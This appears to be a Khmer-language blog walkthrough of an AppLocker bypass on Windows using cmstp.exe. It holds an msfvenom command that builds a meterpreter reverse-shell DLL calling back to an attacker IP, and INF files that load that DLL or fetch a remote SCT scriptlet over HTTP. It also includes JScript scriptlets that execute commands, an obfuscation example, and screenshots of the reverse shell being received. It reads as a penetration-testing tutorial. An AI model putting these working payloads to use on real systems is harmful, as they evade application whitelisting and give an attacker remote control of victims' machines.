---
title: "AppLocker Bypass - CMSTP"
date: 2022-12-03T02:00:06+07:00
description: DLL Bypass AppLocker ជាមួយឯកសារ CMSTP
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: thik
authorEmoji: 🐱
tags: 
- dll
- bypass
- inf
- sct
categories:
- CMSTP
series:
- WinExE
image: images/feature3/code-file.png
---

ឯកសារ CMSTP ត្រូវបានរក្សាទុកនៅក្នុងថតឯកសារនៃវីនដូ៖

{{< highlight plain "linenos=table" >}}
C:\Windows\System32\cmstp.exe
C:\Windows\SysWOW64\cmstp.exe
{{< / highlight >}}

វីធីសាស្ត្រមួយនេះត្រូវបានរកឃើញដោយលោក [Oddvar Moe](https://twitter.com/Oddvarmoe) អាចអានលំអិតនៅក្នុង [Blog](https://twitter.com/Oddvarmoe) របស់គាត់។

#### DLL

Metasploit ត្រូវបានប្រើប្រាស់ដើម្បីបង្កើតឯកសារមេរោគ DLL តាមរយៈ MSFvenom ។

{{< highlight plain "linenos=table" >}}
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.55 LPORT=4444 -f dll > idm.dll
{{< / highlight >}}

![Metasploit - Malicious Dll Generation](/en/posts/img/2022/12/applocker-cmstp-bypass/generate-malicious-dll.png)

សម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងរបស់ឯកសារ DLL ដែល​បាន​បង្កើត​រួច។

{{< highlight inf "linenos=table,hl_lines=9" >}}
[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection
 
[RegisterOCXSection]
C:\Users\Victim\idm.dll
 
[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="idm"
ShortSvcName="idm"
{{< / highlight >}}

រក្សាទុកជា <span style="color:red">"idm-service.inf"</span>

បើកដំណើរការ Multi/handler នៅលើម៉ាស៊ីនមេ និង កំណត់ទទួលការតភ្ជាប់។

![CMSTP – Metasploit Multi Handler](/en/posts/img/2022/12/applocker-cmstp-bypass/msf-multi-handler.png)

Payload នឹងដំណើរការភ្លាមៗនៅពេលដែលឯកសារ INF ត្រូវ​បាន​បើក​ដោយ​ប្រើប្រាស់ឯកសារ CMSTP ។

![CMSTP – INF Execution Locally](/en/posts/img/2022/12/applocker-cmstp-bypass/exec-inf.png)

បន្ទាប់មក Metasploit និងទទួលបាន Reverse Shell ក្រោយពីស្គ្រីបបានបើកឯកសារ DLL រួច។

![CMSTP – Meterpreter via DLL Execution](/en/posts/img/2022/12/applocker-cmstp-bypass/reverse-shell.png)

#### SCT

CMSTP ក៏អាចប្រើប្រាស់ឯកសារប្រភេទ SCT ដើម្បី​ទាញយក​ពាក្យ​បញ្ជា​ផ្សេងៗ​ពីម៉ាស៊ីនមេ​មក​ប្រើប្រាស់​ផង​ដែរ។

លោក [Nick Tyrere](https://twitter.com/nickTyrer/) បានបង្ហាញលំអិតនៅក្នុង [Twitter](https://twitter.com/NickTyrer/status/958450014111633408) របស់គាត់។

លោកក៏បានបង្កើតស្គ្រីបនេះដោយដាក់ឈ្មោះថា [powersct.sct](https://gist.github.com/NickTyrer/0604bb9d7bcfef9e0cf82c28a7b76f0f/) ដែល​​ប្រើ​សម្រាប់​បើក​ដំណើរ​ការ​ពាក្យ​បញ្ជា​គ្រោះ​ថ្នាក់​ណាមួយ​ចេញ​ពី PowerShell ។

សម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងដំណរភ្ជាប់របស់ឯកសារ SCT ។

{{< highlight inf "linenos=table,hl_lines=9" >}}
[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection
 
[RegisterOCXSection]
%11%\scrobj.dll,NI,http://192.168.200.55/pentestlab.sct
 
[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="idm"
ShortSvcName="idm"
{{< / highlight >}}

{{< highlight cfg "linenos=table,hl_lines=12" >}}
### powersct.sct

<?XML version="1.0"?>
<scriptlet>
<registration 
    progid="Pentest"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
	<!-- Proof Of Concept - @netbiosX -->
	<script language="JScript">
		<![CDATA[
	
			var r = new ActiveXObject("WScript.Shell").Run("cmd /k cd c:\ & pentestlab.exe");	
	
		]]>
</script>
</registration>
</scriptlet>
{{< / highlight >}}

{{< highlight cfg "linenos=table,hl_lines=12" >}}
### SCT File Obfuscation Examples:

<?XML version="1.0"?>
<scriptlet>
<registration 
    progid="PoC"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
	<!-- Proof Of Concept - Casey Smith @subTee -->
	<!--  License: BSD3-Clause -->
	<script language="JScript">
	<![CDATA[
		//x86 only. C:\Windows\Syswow64\regsvr32.exe /s /u /i:file.sct scrobj.dll
		
		var scr = new ActiveXObject("MSScriptControl.ScriptControl");
		scr.Language = "JScript";
		scr.ExecuteStatement('var r = new ActiveXObject("WScript.Shell").Run("calc.exe");');
		scr.Eval('var r = new ActiveXObject("WScript.Shell").Run("calc.exe");');
		
		//https://msdn.microsoft.com/en-us/library/aa227637(v=vs.60).aspx
		//Lots of hints here on futher obfuscation
		]]></script>
</registration>
</scriptlet>
{{< / highlight >}}

នៅពេលដំណើរការស្ក្រីបនៃឯកសារ INF វានឹងលោត​ផ្ទាំង​វីន​ដូមួយ​ចេញ​មក​ដើម្បី​ដំណើរ​ការ​ពាក្យ​បញ្ជា PowerShell ។

![CMSTP – SCT Execution Locally](/en/posts/img/2022/12/applocker-cmstp-bypass/exec-inf.png)

ក្រោយដំណើរការស្ក្រីបរួច ឯកសារមេរោគនឹងធ្វើការទាញយកពីម៉ាស៊ីនមេហើយធ្វើប្រតិបត្តិភ្លាមៗតែម្ដង។

ពេលនោះ Metasploit និងទទួលបាន Reverse Shell ហើយគ្រប់​គ្រង​ម៉ាស៊ីន​ទាំង​មូល៕

![CMSTP – Meterpreter via SCT Execution](/en/posts/img/2022/12/applocker-cmstp-bypass/reverse-shell.png)

<b>ឯកសារយោង:</b>
- [pentestlab.blog](https://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/)
- [ha.cker.in](https://ha.cker.in/index.php/Article/15159)
- [ired.team](https://www.ired.team/offensive-security/code-execution/t1170-mshta-code-execution)
